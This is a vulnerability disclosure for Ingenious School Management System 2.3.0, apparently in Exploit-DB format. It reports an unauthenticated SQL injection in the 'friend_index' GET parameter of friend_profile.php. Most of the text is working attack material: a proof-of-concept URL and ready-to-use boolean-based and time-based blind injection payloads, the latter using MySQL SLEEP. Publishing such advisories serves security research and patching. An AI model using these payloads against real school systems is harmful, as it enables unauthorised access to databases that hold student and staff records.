# Date: 01.11.2017
# Vendor Homepage: http://iloveprograming.com/
# Software Link: https://www.codester.com/items/4945/ingenious-school-management-system
# Demo: http://iloveprograming.com/view/login.php
# Version: 2.3.0
# Category: Webapps
# Tested on: Kali Linux 2.0
# Exploit Author: Giulio Comi
# Contact: https://<http://ihsan.net/>linkedin.com/in/giuliocomi
#Description
 
This vulnerability allows an attacker to inject SQL commands (without authentication) in &#039;friend_index&#039; GET parameter.
 
# Proof of Concept:
 
http://localhost/view/friend_profile.php?friend_type=Student&friend_index=[SQL_injection_payload]
 
 
# Vulnerable Parameter: friend_index (GET)
 
 
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: friend_type=Student&friend_index=1&#039; AND 2576=2576 AND &#039;YJeg&#039;=&#039;YJeg
    Vector: AND [INFERENCE]
 
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: friend_type=Student&friend_index=1&#039; AND SLEEP(5) AND &#039;rliO&#039;=&#039;rliO
    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])

